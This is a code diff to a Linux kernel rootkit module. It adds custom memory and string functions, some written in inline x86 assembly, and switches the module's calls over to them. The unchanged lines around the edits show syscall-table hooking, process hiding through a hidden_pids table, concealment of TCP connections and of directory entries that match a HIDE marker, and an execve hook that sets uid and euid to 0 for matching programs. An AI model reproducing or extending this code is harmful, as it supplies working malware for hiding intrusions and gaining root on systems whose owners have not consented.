@@ -111,6 +111,73 @@ static void *our_memmove(void *dest, const void *src, size_t count)
 }
 
 /**
+ * memcmp - Compare two areas of memory
+ * @cs: One area of memory
+ * @ct: Another area of memory
+ * @count: The size of the area.
+ */
+static int our_memcmp(const void *cs, const void *ct, size_t count)
+{
+        const unsigned char *su1, *su2;
+        int res = 0;
+
+        for (su1 = cs, su2 = ct; 0 < count; ++su1, ++su2, count--)
+                if ((res = *su1 - *su2) != 0)
+                        break;
+        return res;
+}
+
+/**
+ * memset - Fill a region of memory with the given value
+ * @s: Pointer to the start of the area.
+ * @c: The byte to fill the area with
+ * @count: The size of the area.
+ *
+ * Do not use memset() to access IO space, use memset_io() instead.
+ */
+static void *our_memset(void *s, int c, size_t count)
+{
+        char *xs = s;
+
+        while (count--)
+                *xs++ = c;
+        return s;
+}
+
+/**
+ * memcpy - Copy one area of memory to another
+ * @dest: Where to copy to
+ * @src: Where to copy from
+ * @count: The size of the area.
+ *
+ * You should not use this function to access IO space, use memcpy_toio()
+ * or memcpy_fromio() instead.
+ */
+void *our_memcpy(void *dest, const void *src, size_t count)
+{
+        char *tmp = dest;
+        const char *s = src;
+
+        while (count--)
+                *tmp++ = *s++;
+        return dest;
+}
+
+static size_t our_strlen(const char *s)
+{
+        int d0;
+        int res;
+        asm volatile("repne\n\t"
+                "scasb\n\t"
+                "notl %0\n\t"
+                "decl %0"
+                : "=c" (res), "=&D" (d0)
+                : "1" (s), "a" (0), "0" (0xffffffffu)
+                : "memory");
+        return res;
+}
+
+/**
  * strstr - Find the first substring in a %NUL terminated string
  * @s1: The string to be searched
  * @s2: The string to search for
@@ -119,17 +186,37 @@ char *our_strstr(const char *s1, const char *s2)
 {
         int l1, l2;
 
-        l2 = strlen(s2);
+        l2 = our_strlen(s2);
         if (!l2)
                 return (char *)s1;
-        l1 = strlen(s1);
+        l1 = our_strlen(s1);
         while (l1 >= l2) {
                 l1--;
-                if (!memcmp(s1, s2, l2))
+                if (!our_memcmp(s1, s2, l2))
                         return (char *)s1;
                 s1++;
         }
         return NULL;
+}
+
+static int our_strcmp(const char *cs, const char *ct)
+{
+        int d0, d1;
+        int res;
+        asm volatile("1:\tlodsb\n\t"
+                "scasb\n\t"
+                "jne 2f\n\t"
+                "testb %%al,%%al\n\t"
+                "jne 1b\n\t"
+                "xorl %%eax,%%eax\n\t"
+                "jmp 3f\n"
+                "2:\tsbbl %%eax,%%eax\n\t"
+                "orb $1,%%al\n"
+                "3:"
+                : "=a" (res), "=&S" (d0), "=&D" (d1)
+                : "1" (cs), "2" (ct)
+                : "memory");
+        return res;
 }
 
 static int our_atoi(char *str)  
@@ -137,7 +224,7 @@ static int our_atoi(char *str)
     int res = 0;  
     int mul = 1;  
     char *ptr;  
-    for(ptr = str + strlen(str)-1; ptr >= str; ptr--){  
+    for(ptr = str + our_strlen(str)-1; ptr >= str; ptr--){  
         if(*ptr < '0' || *ptr > '9')  
             return -1;  
         res += (*ptr -'0') * mul;  
@@ -172,7 +259,7 @@ static void __uninit_hook_table(void)
     tcp = proc_net->subdir->next;
 
     /*  tcp4_seq_show() with original */
-    while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
+    while (our_strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
         tcp = tcp->next;
 
     if (tcp != proc_net->subdir)
@@ -207,7 +294,7 @@ static void __init_hook_table(void)
     /* any additional (non-syscall) hooks go here */
 
     /* clear Daniel's hidden_pids */
-    memset(hidden_pids, 0, sizeof(hidden_pids));
+    our_memset(hidden_pids, 0, sizeof(hidden_pids));
 	hidden_pids[PID_TO_HIDE]=1;
 
     /* Daniel Palacio's tcp hook */
@@ -219,7 +306,7 @@ static void __init_hook_table(void)
         return;
 
     tcp = proc_net->subdir->next;
-    while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
+    while (our_strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
         tcp = tcp->next;
 
     if (tcp != proc_net->subdir)
@@ -234,7 +321,6 @@ static void __init_hook_table(void)
 asmlinkage /* required: args passed on stack to syscall */
 static void hook_example_exit(int status)
 {
-printk(KERN_ERR "DEBUG: Passed %s %d \n",__FUNCTION__,__LINE__);
     /* standard hook prologue */
     asmlinkage int (*orig_exit)(int status);
     void **sys_p    = (void **)sys_table_global;
@@ -376,7 +462,7 @@ static int hook_getdents32 (unsigned int fd, struct linux_dirent __user *dirp, u
         }
 
         /* Hide processes flagged or filenames starting with HIDE*/
-        if ((hide_proc == 1) || (strstr(dir3->d_name, HIDE) != NULL))
+        if ((hide_proc == 1) || (our_strstr(dir3->d_name, HIDE) != NULL))
         {
         #ifdef __DEBUG__
             printk("*** getdents32 hiding: %s\n", dir3->d_name);
@@ -384,7 +470,7 @@ static int hook_getdents32 (unsigned int fd, struct linux_dirent __user *dirp, u
         }
         else
         {
-            memcpy((char *)dir3 + r, dir3, dir3->d_reclen);
+            our_memcpy((char *)dir3 + r, dir3, dir3->d_reclen);
             r += dir3->d_reclen;
         }
 
@@ -420,7 +506,7 @@ asmlinkage static int hook_execve(const char *filename, char *const argv[], char
             hidden_pids[current->pid] = 1;
     }
 
-    if((strstr(filename, HIDE) != NULL))
+    if((our_strstr(filename, HIDE) != NULL))
     {
         current->uid    = 0;
         current->euid   = 0;
